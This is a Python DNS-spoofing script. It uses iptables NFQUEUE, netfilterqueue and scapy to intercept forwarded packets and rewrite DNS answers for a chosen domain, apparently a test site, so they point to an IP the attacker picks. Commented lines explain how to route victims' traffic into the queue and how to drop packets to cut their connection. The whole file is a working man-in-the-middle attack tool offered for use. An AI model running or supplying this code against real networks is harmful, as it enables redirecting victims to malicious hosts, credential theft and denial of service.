#!/usr/bin/env python
import subprocess
import scapy.all as scapy
import netfilterqueue

#subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num 0"]) #  //YOU CAN CALL THIS COMMAND HERE OR MANUALLY TYPE IT IN THE TERMINAL
#subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0") #   // TO TEST ON HOME NETWORK (OWN IP/127.0.0.1)
#subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0") #   // TO TEST ON HOME NETWORK
#subprocess.call("iptables --flush")                              // USE THIS TO RESET IPTABLES RULES

def process_packet(packet):
    scapy_pkt = scapy.IP(packet.get_payload()) #                // TO ENCAPSULATE THE PAYLOAD IN SCAPY TO MODIFY WITH EASE
    if scapy_pkt.haslayer(scapy.DNSRR):        #               // TO CHECK IF THE PACKET HAS DNS LAYER
        qname = scapy_pkt[scapy.DNSQR].qname 
        if "www.vulnweb.com" in qname.decode():
            print("--> Spoofing Target")
            answer= scapy.DNSRR(rrname=qname, rdata="") #    // RDATA = IP WE WANT 
            scapy_pkt[scapy.DNS].an = answer
            scapy_pkt[scapy.DNS].ancount = 1
        else:
            print("NOT PRESENT")

    del scapy_pkt[scapy.IP].len
    del scapy_pkt[scapy.IP].chksum
    del scapy_pkt[scapy.UDP].len
    del scapy_pkt[scapy.UDP].chksum

    packet.set_payload(bytes(scapy_pkt))
    #print(scapy_pkt.show())                                // TO SEE DETAILS OF A SCAPY PACKET
    #print(packet.get_payload())                           // TO SEE DETAILS OF A PACKET
    packet.accept() #                                     // TO FORWARD PACKETS
    #packet.drop()                                       // TO DROP THE PACKET CUTTING INTERNET ACCESS

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
